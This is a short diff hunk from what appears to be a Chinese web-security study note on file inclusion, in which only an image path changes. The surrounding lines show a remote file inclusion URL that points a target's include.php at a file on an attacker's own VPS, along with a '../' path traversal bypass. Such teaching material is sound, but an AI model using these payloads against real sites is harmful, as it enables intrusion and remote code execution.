@@ -61,7 +61,7 @@ http://xxx.com/include.php?file=http://your vps.com/1.txt
 
 ../../../../../绕过
 
-![../../../绕过](1.png)
+![../../../绕过](content/posts/小迪web50天文件包含/1.png)
 
 # 黑盒分析
 1、功能点
